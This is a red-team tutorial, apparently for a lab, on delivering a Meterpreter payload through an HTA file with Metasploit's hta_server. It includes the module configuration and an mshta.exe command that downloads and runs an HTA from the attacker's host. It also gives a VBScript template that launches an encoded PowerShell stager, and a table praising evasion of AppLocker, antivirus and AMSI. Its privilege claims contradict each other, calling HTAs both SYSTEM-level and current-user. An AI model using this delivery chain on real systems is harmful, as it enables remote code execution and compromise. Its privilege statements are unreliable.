# HTA (HTML Application) Exploitation Explained

## 🔍 What Is an HTA File?
**HTA = HTML Application** — a Microsoft technology that lets **HTML files run as full-trusted Windows applications** with **SYSTEM-level privileges**.

- File extension: `.hta`
- Executed by: `mshta.exe` (legitimate Windows binary)
- Bypasses: Internet security zones, script execution policies, AMSI

> 💡 **Critical fact**: HTAs run with **full system privileges** — no UAC prompt, no security warnings.

---
## 🧠 How `hta_server` Works in Your Lab

### Step 1: Generate & Host Malicious HTA
```msf
use exploit/windows/misc/hta_server
set LHOST 10.10.100.8
set LPORT 1234
run
```
✅ Output:
```
[*] Using URL: http://10.10.100.8:8080/qk0fl1mn4.hta
```

### Step 2: Deliver to Target
On victim machine:
```powershell
mshta.exe http://10.10.100.8:8080/qk0fl1mn4.hta
```

### What Happens Internally:
1. `mshta.exe` downloads `qk0fl1mn4.hta` from your Kali box
2. HTA file contains **embedded VBScript** (not visible to user)
3. VBScript executes → connects back to Metasploit handler
4. Handler sends **Meterpreter stage** → full shell in memory

> 🔥 **This is a STAGED payload delivery**:
> - HTA = **stager** (tiny VBScript that connects back)
> - Metasploit handler = sends **stage** (full Meterpreter)

---
## 💀 Why HTA Is Dangerous (Red Team Perspective)

| Feature | Why It Matters |
|--------|---------------|
| **Whitelisted binary** | `mshta.exe` is trusted by Windows → bypasses AppLocker/AV |
| **No AMSI** | VBScript in HTA bypasses PowerShell AMSI scanning |
| **Full privileges** | Runs as current user with **no UAC prompt** |
| **Stealthy** | Looks like "opening a webpage" to users |
| **Works everywhere** | All Windows versions (XP → Windows 11) |

### Real HTA Payload Structure (Simplified)
```html
<HTML>
<HEAD>
<script language="VBScript">
    Set obj = CreateObject("WScript.Shell")
    obj.Run "powershell -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAF..."  ' ← Base64 stager
    self.close
</script>
</HEAD>
<BODY></BODY>
</HTML>
```


